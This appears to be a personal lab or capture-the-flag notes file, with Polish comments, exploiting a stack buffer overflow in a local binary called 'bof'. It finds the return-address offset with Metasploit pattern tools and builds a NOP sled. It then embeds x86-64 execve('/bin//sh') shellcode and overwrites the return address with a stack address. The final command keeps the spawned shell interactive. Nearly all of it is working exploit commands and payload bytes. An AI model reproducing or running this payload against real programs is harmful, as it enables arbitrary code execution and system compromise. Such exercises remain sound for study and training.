#zerknięcie do kodu
strings -n 10 teaParty

echo $(python -c 'print("A" * 650)') |./bof

gdb -q ./bof
set disassembly-flavor intel

# useless
r < <(python -c 'print("A" * 650)')
i r
x/xg $rsp # 0x41 oznacza AAAAA
x/i $rip # chuj go wie

# ładunek
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 650
r < <(echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av)
x/xg $rsp # offset do następnej komendy
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3775413675413575 # wypluwa 616
r < <(python -c 'print("\x90" * 616 + "BBBBCCCC")')
x/xg $rsp - 628 # 0x90 oznacza NOP czyli procesor nic nie robi
# http://shell-storm.org/shellcode/index.html shell w assmeblerze
# nopy * offset  - sługość shellkodu
r < <(python -c 'print("\x90" * (616 - 24) + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")')
x/616xb $rsp - 620 # wyberać się jakiś adres ze środka spośród NOPów
# np 0x7fffffffe38c czyli \x8c\xe3\xff\xff\xff\x7f\x00\x00
r < <(python -c 'print("\x90" * (616 - 24) + "\xcc\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" + "\x8c\xe3\xff\xff\xff\x7f\x00\x00")')
# xcc oznacza breakpoint
r < <(python -c 'print("\x90" * (616 - 24 - 100) + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" + "\x90" *100 + "\x8c\xe3\xff\xff\xff\x7f\x00\x00")')
# jeżeli wyjdzie normalnie to git
(python -c 'print("\x90" * (616 - 24 - 100) + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" + "\x90" *100 + "\x8c\xe3\xff\xff\xff\x7f\x00\x00")';cat) | ./bof
